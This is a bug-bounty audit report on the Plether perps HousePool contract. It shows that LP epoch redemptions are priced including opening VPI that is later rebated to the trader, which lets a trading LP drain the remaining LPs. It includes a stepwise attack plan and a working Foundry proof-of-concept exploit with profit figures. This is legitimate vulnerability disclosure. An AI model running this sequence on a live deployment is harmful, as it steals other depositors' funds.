# \#97810 [SC-Critical] Exit pricing ignores pending VPI rebates in HousePool LP epoch settlement, leading to theft of LP funds

**Submitted on Nov 3rd 2026 at 10:49:50 UTC by @kiings91 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97810
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The VPI paid when a skew-adding position opens goes straight into Junior principal, and the same VPI is rebated to the trader from the pool when the position closes. LP epoch redemptions are priced without that pending rebate, so an LP who redeems while the position is open takes part of VPI the pool later pays back, and the LPs who stay cover it. A Junior LP who also trades can do this on purpose around an epoch boundary: with the release parameters, one cycle on a 1M USDG pool leaves the attacker 99.91 USDG up and the remaining LP 252.10 USDG down, and the cycle can be repeated.

## Vulnerability Details

All code references are to commit `a82d4fe`; the links are under References.

**1. The opening VPI becomes Junior principal at once.** `CfdEngineSettlementSidecar.executeOpen` (L446-L464) takes the trade cost (VPI plus execution fee) from the trader. Whatever is not credited to the treasury is recorded as pool revenue that has already arrived:

```solidity
IHousePool(host.pool()).recordClaimantInflow(
    poolCashInflowAssets,
    IHousePool.ClaimantInflowKind.Revenue,
    IHousePool.ClaimantInflowCashMode.CashArrived
);
```

Once the tranches hold principal, `recordClaimantInflow` (HousePool.sol L640-L648) only does `accountedAssets += amount`. No pending bucket is created, so the VPI counts in `totalAssets()` (HousePool.sol L426-L429) straight away.

**2. Nothing offsets the rebate the position can claim back.** `buildReconcileSnapshot` (HousePoolAccountingLib.sol L60-L78) uses physical assets, trader claims and the terminal price delta. Nothing in it covers VPI a position may get back. The only VPI reserve is for negative lifetime VPI (`_negativeVpiReserveTarget` (CfdEnginePlanLib.sol L48-L52)). A positive `vpiAccrued` has no reserve and no liability anywhere.

**3. The redemption is priced from that principal.** `_settleLpEpoch` (HousePool.sol L835-L841) reconciles and then prices Junior directly from the principal that now includes the VPI:

```solidity
_reconcile(accountingSnapshot, statusSnapshot);
...
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

Pricing is plain pro rata (`HousePoolRedemptionMathLib` L45-L47) with no exit fee outside frozen mode. Anyone can trigger settlement through `OrderRouter.settleLpEpoch` (L479-L484). A redemption funded for a fraction `q` of Junior supply in that epoch therefore takes about `q * V` of the opening VPI `V`.

**4. The close pays the full V back from the pool.** On close, `CloseAccountingLib` (L103-L118) computes a fresh VPI delta at the current skew and depth. The delta is clamped so lifetime VPI never goes below zero:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The redemption has just reduced depth, which only makes the raw rebate larger. The clamp therefore binds and the rebate is exactly `V`. The rebate is netted against the close fee (`CfdEnginePlanLib` L1041-L1059) and paid from free pool cash (L973-L977). Plenty of cash is left after the redemption, so nothing is waived.

Net effect: the pool collected `V`, paid `q * V` of it out to the redeemer, then returned all of `V` to the trader. The LPs who stayed are short `q * V` minus the close fee the pool keeps. When the redeemer and the trader are the same address, that is a transfer from the remaining LPs to them.

ACCOUNTING_SPEC L1064-1066 and SECURITY.md L871-872 say that anticipated VPI stays outside terminal `K` and does not inflate NAV. I'm not arguing against keeping it out of the price book; that rule keeps value the pool hasn't received out of NAV. This case runs the other way: the pool has received the VPI and counts it as Junior principal at once, but the obligation to rebate it is left out, so the NAV that exiting LPs are paid at is inflated. The same documents state the goal this breaks:
- SECURITY.md L859-860: new LPs "do not inherit old trader obligations at a higher deposit NAV".
- WHITEPAPER L887-888: the reserve is excluded "so LPs cannot withdraw it as marked equity before the matching position obligation settles".
- WHITEPAPER L851-865: VPI telescopes, so a round trip at constant depth nets to zero. In other words, VPI collected at open is not LP income while the skew it priced is still open.

The behavior is not listed in the Known Limitations of SECURITY.md (LP accounting L1380-1399, VPI L1434-1444).

This is also not the AI scan finding "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate". There a drop in liquidity makes the rebate larger. Here the rebate never exceeds `V` (the PoC asserts rebate plus close fee equals `V`), and the loss comes from how the exit is priced: in the PoC controls, the trade alone and the redemption alone do not hurt the remaining LP.

The PoC uses a SHORT because near 1.15 its maximum payout is capped by `CAP_PRICE`, so it reserves little of the pool and most of the redemption is funded in the same epoch. A LONG of the same size reserves more and the effect is weaker.

## Impact Details

Critical: direct theft of user funds. Junior LP USDG held in HousePool moves to the attacker without any action by the victims. This is a loss of deposited principal, not of unclaimed yield. The remaining LP ends with less than they deposited, while the same trade without the redemption would have left them slightly up. The attacker needs no privileges. Every step is a public call, and an independent keeper can execute the orders and settle the epoch.

Results with the release parameters (DEPLOYMENT.md), mark 1.15, a SHORT at 38-40% of pool assets (skew limit 40%), and the attacker holding 80% of Junior:

| Pool | Opening VPI V | Attacker net | Remaining LP |
|---|---|---|---|
| 1M USDG | 721.88 | +99.91 | −252.10 |
| 10M USDG | 7,960.15 | +1,032.92 | −2,629.13 |
| 1M USDG, two cycles | 721.88 per cycle | +211.82 | −503.87 |

- The remaining LPs lose about `q * V` minus the close fee per cycle. `V` grows with the square of the skew and inversely with depth, so at the skew limit the loss is a fixed fraction of the pool (about 2.5 bps here) and grows with TVL.
- On the 1M pool, the remaining LP's loss equals the attacker's gain plus the opening fee to the treasury (151.98) and the keeper's execution bounty (0.20).
- A cycle takes about three hours (deposit cooldown, the 1h epoch, the next request). Nothing stops repetition; two cycles roughly double the loss.
- No attacker is needed for the loss. An ordinary LP who redeems in an epoch where someone else opened a skew-adding position ends 423.10 USDG better off than without that trade, and the remaining LP is again down 252.10.
- The attacker pays the opening and closing fees (about 304 USDG against `V` = 721.88 on the 1M pool), so the redemption has to be funded for roughly 40% or more of Junior in that epoch. The position is held for about 2.5 minutes, so price exposure is small. Under the program rules, high capital and low ROI are not reasons to downgrade.

## References

- `CfdEngineSettlementSidecar.executeOpen`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L446-L464
- `HousePool.recordClaimantInflow`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L640-L648
- `HousePool._settleLpEpoch`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L841
- `HousePoolAccountingLib.buildReconcileSnapshot`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L78
- `CloseAccountingLib` VPI clamp: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118
- `CfdEnginePlanLib` close rebate: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1041-L1059
- `HousePool.totalAssets`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L426-L429
- `CfdEnginePlanLib._negativeVpiReserveTarget`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L48-L52
- `HousePoolRedemptionMathLib` pro-rata pricing: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolRedemptionMathLib.sol#L45-L47
- `OrderRouter.settleLpEpoch`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L479-L484
- `CfdEnginePlanLib` rebate paid from free pool cash: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L973-L977
- ACCOUNTING_SPEC L1064-1066: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L1064-L1066
- SECURITY.md L859-872: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L859-L872
- WHITEPAPER L851-865 and L887-888: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L851-L888
- SECURITY.md Known Limitations: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1328-L1444
- AI scan, "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate": https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md?plain=1#L1742

## Proof of Concept

## Proof of Concept

Steps (Alice holds 80% of Junior, Bob 20%; an independent keeper executes orders and settles epochs):

1. Alice queues a Junior redemption for all her shares.
2. About 150 seconds before the epoch boundary, Alice opens a skew-adding SHORT at roughly 38% of pool assets and pays the opening VPI `V`. It goes into Junior principal.
3. At the boundary, the keeper calls `OrderRouter.settleLpEpoch` at the same price. Alice's redemption is priced from principal that includes `V`.
4. Alice claims the redemption.
5. Alice closes the SHORT at the same price. The close rebates the full `V` from the pool.
6. Alice deposits her USDG back. The next epoch books the close, and everyone's holdings are measured.

The test uses the repo's `BasePerpTest` fixture with the release parameters from DEPLOYMENT.md, asserted in `setUp`. Only Pyth and USDG are mocked. After `setUp`, every action is a public call from a plain EOA. The three attack tests run the same sequence three times from one snapshot: the attack, redemption only (no trade), and trade only (no redemption). The no-attacker test runs it twice, with and without the other trader's position. Put the file at `packages/perps/test/poc/JuniorExitVpi.t.sol` and, from `packages/perps`, run:

```sh
forge test --match-path test/poc/JuniorExitVpi.t.sol -vv
```

Results on `a82d4fe` (USDG; the log prints 6-decimal atoms):

- 1M pool: `V` = 721.88. Alice's redemption is funded for 71.9% of Junior supply in that epoch (she holds 80%; the rest is funded in a later epoch) and pays 525.62 more than in the redemption-only run, against `q * V` = 518.79. The close pays the full `V` back (rebate plus close fee equals `V`, nothing waived). Alice ends 99.91 up and Bob 252.10 below the starting value.
- Controls: with the redemption alone, Alice and Bob are unchanged (asserted within 50 atoms; the log shows −15 and −12); with the trade alone, Bob is not worse off (the log shows Bob 34.57 up).
- 10M pool: Alice +1,032.92, Bob −2,629.13.
- Two cycles on the 1M pool: Alice +211.82, Bob −503.87.
- No attacker: Alice only redeems while an unrelated trader, Carol, opens and closes. Alice receives 423.10 more than without Carol's trade, and Bob ends 252.10 down.
- In the three attack tests, all holders' wealth changes sum to zero within 5 atoms: Bob's loss is Alice's gain plus the opening fee paid to the treasury and the keeper's execution bounty.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {ICfdEngineRiskParamsView} from "@plether/perps/interfaces/ICfdEngineRiskParamsView.sol";
import {ICfdEngineSettlementSidecar} from "@plether/perps/interfaces/ICfdEngineSettlementSidecar.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

/// @dev A Junior redemption is priced with the opening VPI of a position that is still open, and the same VPI is
///      rebated to the trader from the pool when the position closes. Release parameters from DEPLOYMENT.md; only
///      Pyth and USDG are mocked. After setUp every action goes through public entry points with plain EOAs, and an
///      independent keeper executes the orders and settles the LP epochs.
contract JuniorExitVpiTest is BasePerpTest {
    address internal constant ALICE = address(0xA11CE5); // Junior LP that redeems (and trades, in the attack runs)
    address internal constant BOB = address(0xB0B5); // Junior LP that stays in the pool
    address internal constant CAROL = address(0xCA201); // unrelated trader (honest-redeemer test only)
    address internal constant KEEPER = address(0x6EEE9);
    address internal constant OTHER = address(0xD0D1); // small deposit that gives an epoch work when nobody redeems

    uint256 internal constant PRICE = 1.15e8;

    enum Mode {
        ATTACK, // redeem, and open/close around the epoch settlement
        REDEEM_ONLY,
        TRADE_ONLY
    }

    struct Cfg {
        uint256 junior; // Junior deposits of ALICE + BOB
        uint256 aliceBps; // ALICE's share of them
        uint256 notionalBps; // SHORT notional in bps of pool assets (skew limit: 40%)
        uint256 cycles;
        bool aliceTrades; // false: CAROL opens and closes, ALICE only redeems
    }

    struct Res {
        int256 aliceNet;
        int256 bobNet;
        int256 sumNet; // ALICE, CAROL, BOB, KEEPER, seed holder, treasury
        uint256 openVpi; // all cycles
        uint256 v0; // opening VPI of the first cycle
        uint256 rebatePaid;
        uint256 rebateWaived;
        uint256 closeFees;
        uint256 redeemAssets0;
        uint256 fundedShares0;
        uint256 juniorSupply0;
    }

    uint256[] internal reqIds;

    // ------------------------------------------------------------ release parameters (DEPLOYMENT.md)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8_000);

        ICfdEngineAdminHost.EngineRiskConfig memory risk = _engineRiskConfig();
        risk.executionFeeBps = 4;
        risk.frozenCloseSpreadBps = 50;
        risk.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(risk);
        vm.warp(block.timestamp + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();

        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.adverseConfidenceMultiplierBps = 2_500;
        rc.minOpenNotionalAssets = 1_000e6;
        rc.maxPendingOrders = 5;
        rc.maxExecutionWindowSeconds = 60;
        rc.positionProtectionTriggerBountyAssets = 200_000;
        routerAdmin.proposeRouterConfig(rc);
        vm.warp(routerAdmin.routerConfigActivationTime());
        routerAdmin.finalizeRouterConfig();

        juniorVault.proposeMaintenanceFeeConfig(0, PROTOCOL_TREASURY_ACCOUNT);
        vm.warp(juniorVault.maintenanceFeeConfigActivationTime());
        juniorVault.finalizeMaintenanceFeeConfig();

        // the timelock warps end on a weekend (oracle-frozen market); move to a Tuesday
        vm.warp(SETUP_TIMESTAMP + 15 days);

        CfdTypes.RiskParams memory p = ICfdEngineRiskParamsView(address(engine)).riskParams();
        assertEq(p.vpiFactor, 0.01e18);
        assertEq(p.maxSkewRatio, 0.4e18);
        assertEq(p.maintMarginBps, 10);
        assertEq(p.initMarginBps, 20);
        assertEq(p.fadMarginBps, 300);
        assertEq(p.baseCarryBps, 500);
        assertEq(engine.executionFeeBps(), 4);
        assertEq(engine.frozenCloseSpreadBps(), 50);
        assertEq(engine.CAP_PRICE(), 2e8);
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10);
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2_500);
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6);
        assertEq(pool.maxSeniorShareBps(), 8_000);
    }

    // ------------------------------------------------------------ tests

    function test_exitPremium_1MPool() public {
        _scenario("1M pool", _cfg());
    }

    function test_exitPremium_10MPool() public {
        Cfg memory c = _cfg();
        c.junior = 10_000_000e6;
        c.notionalBps = 3_990;
        _scenario("10M pool", c);
    }

    function test_exitPremium_twoCycles() public {
        Cfg memory c = _cfg();
        c.cycles = 2;
        _scenario("1M pool, two cycles", c);
    }

    /// @dev No attacker: ALICE never trades. CAROL opens and later closes; ALICE redeems in that epoch.
    function test_exitPremium_honestRedeemer() public {
        Cfg memory c = _cfg();
        c.aliceTrades = false;
        uint256 snap = vm.snapshotState();
        Res memory a = _run(c, Mode.ATTACK);
        vm.revertToState(snap);
        Res memory k = _run(c, Mode.REDEEM_ONLY);

        console2.log("honest redeemer, opening VPI V      ", a.v0);
        console2.log("redeeming LP net, with CAROL's trade", a.aliceNet);
        console2.log("redeeming LP net, no trade          ", k.aliceNet);
        console2.log("remaining LP vs its start           ", a.bobNet);

        assertGt(a.aliceNet, k.aliceNet, "redeeming LP receives more than without the trade");
        assertLt(a.bobNet, 0, "remaining LP ends below its starting value");
    }

    // ------------------------------------------------------------ scenario

    function _cfg() internal pure returns (Cfg memory) {
        return Cfg({junior: 1_000_000e6, aliceBps: 8_000, notionalBps: 3_800, cycles: 1, aliceTrades: true});
    }

    function _scenario(string memory label, Cfg memory c) internal {
        uint256 snap = vm.snapshotState();
        Res memory a = _run(c, Mode.ATTACK);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        Res memory k1 = _run(c, Mode.REDEEM_ONLY);
        vm.revertToState(snap);
        Res memory k2 = _run(c, Mode.TRADE_ONLY);

        uint256 q = a.fundedShares0 * 1e18 / a.juniorSupply0;
        int256 premium = int256(a.redeemAssets0) - int256(a.fundedShares0 * k1.redeemAssets0 / k1.fundedShares0);
        uint256 qV = a.v0 * q / 1e18;

        console2.log(label);
        console2.log("  opening VPI V                 ", a.v0);
        console2.log("  q (share of Junior redeemed)  ", q);
        console2.log("  redemption premium (cycle 1)  ", premium);
        console2.log("  q * V                         ", qV);
        console2.log("  ALICE net, attack             ", a.aliceNet);
        console2.log("  ALICE net, redeem only        ", k1.aliceNet);
        console2.log("  BOB vs his start, attack      ", a.bobNet);
        console2.log("  BOB vs his start, redeem only ", k1.bobNet);
        console2.log("  BOB vs his start, trade only  ", k2.bobNet);

        // controls: the redemption alone leaves ALICE and BOB unchanged, and the trade alone does not hurt BOB
        assertApproxEqAbs(k1.aliceNet, 0, 50, "redeem only: ALICE unchanged");
        assertApproxEqAbs(k1.bobNet, 0, 50, "redeem only: BOB unchanged");
        assertGe(k2.bobNet, -50, "trade only: BOB not worse off");

        // attack
        assertGt(a.aliceNet, 0, "ALICE ends with more USDG than she started with");
        assertGt(a.aliceNet, k1.aliceNet, "ALICE gains over the redeem-only run");
        assertLt(a.bobNet, 0, "BOB ends below his starting value");
        assertGt(premium, 0, "redemption paid above the redeem-only price");
        assertApproxEqRel(uint256(premium), qV, 0.05e18, "premium is q * V");
        // the full V comes back to the trader at close (net of the close fee), nothing waived
        assertApproxEqAbs(a.rebatePaid + a.closeFees, a.openVpi, 0.5e6 * c.cycles, "close rebate == V");
        assertEq(a.rebateWaived, 0, "nothing waived");
        // every USDG ALICE gains (plus fees) is lost by BOB
        assertLe(a.sumNet < 0 ? uint256(-a.sumNet) : uint256(a.sumNet), 5, "wealth changes sum to zero");
    }

    function _run(Cfg memory c, Mode mode) internal returns (Res memory r) {
        delete reqIds;
        bool trade = mode != Mode.REDEEM_ONLY;
        bool redeem = mode != Mode.TRADE_ONLY;
        address trader = c.aliceTrades ? ALICE : CAROL;

        vm.deal(ALICE, 10 ether);
        vm.deal(CAROL, 10 ether);
        vm.deal(KEEPER, 10 ether);
        vm.deal(OTHER, 10 ether);
        vm.deal(BOB, 10 ether);
        _fund(ALICE, c.junior * c.aliceBps / 10_000);
        _fund(BOB, c.junior - c.junior * c.aliceBps / 10_000);
        uint256 margin = pool.totalAssets() * 2 / 100;
        _fundTrader(trader, margin * 3);
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN() + 1);

        int256[6] memory w0 = _snap();

        for (uint256 cyc = 0; cyc < c.cycles; ++cyc) {
            _claimOld();
            uint256 requestId;
            uint256 epochStart;
            if (redeem) {
                // 1. ALICE queues a redemption of all her Junior shares
                uint256 shares = juniorVault.balanceOf(ALICE);
                vm.prank(ALICE);
                requestId = juniorVault.requestRedeem(shares, ALICE, ALICE);
                reqIds.push(requestId);
                epochStart = pool.lpEpochStart(requestId);
            } else {
                settlementToken.mint(OTHER, 1_000e6);
                vm.startPrank(OTHER);
                settlementToken.approve(address(juniorVault), 1_000e6);
                requestId = juniorVault.requestDeposit(1_000e6, OTHER, OTHER);
                vm.stopPrank();
                epochStart = juniorVault.depositEpochStart(requestId);
            }
            require(epochStart > vm.getBlockTimestamp() + 300, "epoch too close");
            vm.warp(epochStart - 150);

            // 2. a skew-adding SHORT opens shortly before the epoch boundary and pays the opening VPI
            uint256 lots;
            if (trade) {
                _mark(KEEPER);
                lots = (pool.totalAssets() * c.notionalBps / 10_000) / PRICE;
                vm.prank(trader);
                uint64 openId = router.commitOrder(CfdTypes.Side.SHORT, lots * 1e20, margin, 0, false);
                _pyth();
                vm.warp(vm.getBlockTimestamp() + 1);
                bytes[] memory data = _pyth();
                vm.prank(KEEPER);
                router.executeOrder{value: 1}(openId, data);
                (uint256 size,,,,,, int256 vpiAccrued) = engine.positions(trader);
                require(size == lots * 1e20 && vpiAccrued > 0, "open did not fill");
                r.openVpi += uint256(vpiAccrued);
                if (cyc == 0) r.v0 = uint256(vpiAccrued);
            }

            // 3. the keeper settles the epoch at the same price, 4. ALICE claims
            vm.warp(epochStart);
            if (cyc == 0) r.juniorSupply0 = juniorVault.totalSupply();
            _settleEpoch(KEEPER);
            if (redeem) {
                uint256 claimShares = juniorVault.claimableRedeemRequest(requestId, ALICE);
                uint256 b0 = settlementToken.balanceOf(ALICE);
                vm.prank(ALICE);
                juniorVault.claimRedeem(requestId, claimShares, ALICE, ALICE);
                if (cyc == 0) {
                    r.fundedShares0 = claimShares;
                    r.redeemAssets0 = settlementToken.balanceOf(ALICE) - b0;
                }
            }

            // 5. the position closes at the same price; the VPI rebate is paid from the pool
            if (trade) {
                vm.warp(vm.getBlockTimestamp() + 5);
                r.closeFees += lots * PRICE * engine.executionFeeBps() / 10_000;
                vm.prank(trader);
                uint64 closeId = router.commitOrder(CfdTypes.Side.SHORT, lots * 1e20, 0, 0, true);
                _pyth();
                vm.warp(vm.getBlockTimestamp() + 1);
                bytes[] memory d2 = _pyth();
                vm.recordLogs();
                vm.prank(KEEPER);
                router.executeOrder{value: 1}(closeId, d2);
                Vm.Log[] memory logs = vm.getRecordedLogs();
                (uint256 sizeAfter,,,,,,) = engine.positions(trader);
                require(sizeAfter == 0, "close did not fill");
                for (uint256 i = 0; i < logs.length; ++i) {
                    if (logs[i].topics[0] == ICfdEngineSettlementSidecar.ActionRebateSettled.selector) {
                        (, uint256 paid, uint256 waived) = abi.decode(logs[i].data, (uint256, uint256, uint256));
                        r.rebatePaid += paid;
                        r.rebateWaived += waived;
                    }
                }
            }

            // ALICE deposits her USDG back; that epoch also books the close into pool accounting
            {
                uint256 amt = settlementToken.balanceOf(ALICE);
                address who = amt > 0 ? ALICE : OTHER;
                if (amt == 0) {
                    amt = 1_000e6;
                    settlementToken.mint(OTHER, amt);
                }
                vm.startPrank(who);
                settlementToken.approve(address(juniorVault), amt);
                uint256 rid = juniorVault.requestDeposit(amt, who, who);
                vm.stopPrank();
                vm.warp(juniorVault.depositEpochStart(rid) + 5);
                _settleEpoch(KEEPER);
                if (who == ALICE) {
                    uint256 claimable = juniorVault.claimableDepositRequest(rid, ALICE);
                    vm.prank(ALICE);
                    juniorVault.claimDeposit(rid, claimable, ALICE, ALICE);
                }
            }
            vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN() + 1);
        }
        _claimOld();

        int256[6] memory w1 = _snap();
        r.aliceNet = w1[0] - w0[0];
        r.bobNet = w1[2] - w0[2];
        for (uint256 i = 0; i < 6; ++i) {
            r.sumNet += w1[i] - w0[i];
        }
    }

    // ------------------------------------------------------------ helpers

    /// @dev MockPyth payload at PRICE with a 1 bp confidence (the oracle accepts up to 10 bps).
    function _pyth() internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        (IOrderRouterAccounting.PendingOrderView memory pending,) = router.getPendingOrderView(router.nextExecuteId());
        if (pending.commitTime != 0 && uint256(pending.commitTime) + 1 <= publishTime) {
            publishTime = uint256(pending.commitTime) + 1;
        }
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(PRICE)),
            SafeCast.toUint64(PRICE / 10_000),
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(PRICE);
    }

    function _mark(address who) internal {
        bytes[] memory d = _pyth();
        vm.prank(who);
        router.updateMarkPrice{value: 1}(d);
    }

    function _settleEpoch(address who) internal {
        bytes[] memory d = _pyth();
        vm.prank(who);
        router.settleLpEpoch{value: 1}(d);
    }

    function _fund(address lp, uint256 amount) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 rid = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(rid) + 1);
        _settleEpoch(lp);
        uint256 cl = juniorVault.claimableDepositRequest(rid, lp);
        assertEq(cl, amount, "deposit settled");
        vm.prank(lp);
        juniorVault.claimDeposit(rid, cl, lp, lp);
    }

    /// @dev USDG wallet + clearinghouse balance + vault shares at current value (+ ALICE's pending redemptions)
    function _wealth(address a) internal view returns (uint256 w) {
        w = settlementToken.balanceOf(a) + clearinghouse.balanceAssets(a);
        uint256 sh = juniorVault.balanceOf(a);
        if (sh > 0) w += juniorVault.convertToAssets(sh);
        sh = seniorVault.balanceOf(a);
        if (sh > 0) w += seniorVault.convertToAssets(sh);
        if (a == ALICE) {
            for (uint256 i = 0; i < reqIds.length; ++i) {
                w += juniorVault.convertToAssets(juniorVault.pendingRedeemRequest(reqIds[i], ALICE));
            }
        }
    }

    function _snap() internal view returns (int256[6] memory w) {
        address[6] memory h = [ALICE, CAROL, BOB, KEEPER, address(this), PROTOCOL_TREASURY_ACCOUNT];
        for (uint256 i = 0; i < 6; ++i) {
            w[i] = int256(_wealth(h[i]));
        }
    }

    /// @dev claims any part of an earlier redemption that was funded in a later epoch
    function _claimOld() internal {
        for (uint256 i = 0; i < reqIds.length; ++i) {
            uint256 cl = juniorVault.claimableRedeemRequest(reqIds[i], ALICE);
            if (cl > 0) {
                vm.prank(ALICE);
                juniorVault.claimRedeem(reqIds[i], cl, ALICE, ALICE);
            }
        }
    }
}
```
